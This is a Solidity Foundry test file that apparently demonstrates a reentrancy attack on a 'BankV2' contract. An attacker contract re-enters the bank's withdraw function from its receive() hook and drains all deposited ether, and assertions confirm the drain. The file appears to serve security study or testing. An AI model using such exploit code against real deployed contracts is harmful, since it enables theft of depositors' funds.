// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {BankV2} from "../src/BankV2.s.sol";

contract BankV2Test is Test {
    BankV2 public bank;

    address mohamed = makeAddr("Mohamed");
    address ahmed = makeAddr("Ahmed");
    address asmaa = makeAddr("Asmaa");
    address attacker = makeAddr("Attacker");

    function setUp() public {
        bank = new BankV2();

        vm.deal(mohamed, 1 ether);
        vm.deal(ahmed, 1 ether);
        vm.deal(asmaa, 1 ether);

        vm.prank(mohamed);
        bank.depositEther{value: 1 ether}();

        vm.prank(ahmed);
        bank.depositEther{value: 1 ether}();

        vm.prank(asmaa);
        bank.depositEther{value: 1 ether}();
    }

    function test_bankV2_attacker_drain_bank() public {
        vm.startPrank(attacker);
        AttackerContract attackerContract = new AttackerContract(address(bank));

        console.log("Attacker Contract Balance Before Attack:", address(attackerContract).balance);
        console.log("Bank Balance Before Attack:", address(bank).balance);
        assertEq(address(attackerContract).balance, 0);
        assertEq(address(bank).balance, 3 ether);

        vm.deal(attacker, 1 ether);
        attackerContract.deposit{value: 1 ether}();

        attackerContract.withdraw();

        console.log("-----------");
        console.log("Attacker Contract Balance After Attack:", address(attackerContract).balance);
        console.log("Bank Balance After Attack:", address(bank).balance);
        assertEq(address(attackerContract).balance, 4 ether);
        assertEq(address(bank).balance, 0);
    }
}

contract AttackerContract {
    address public bank;

    constructor(address _bank) {
        bank = _bank;
    }

    receive() external payable {
        if (bank.balance >= 1 ether) {
            withdraw();
        }
    }

    function deposit() external payable {
        BankV2(bank).depositEther{value: msg.value}();
    }

    function withdraw() public {
        BankV2(bank).withdrawEther();
    }
}
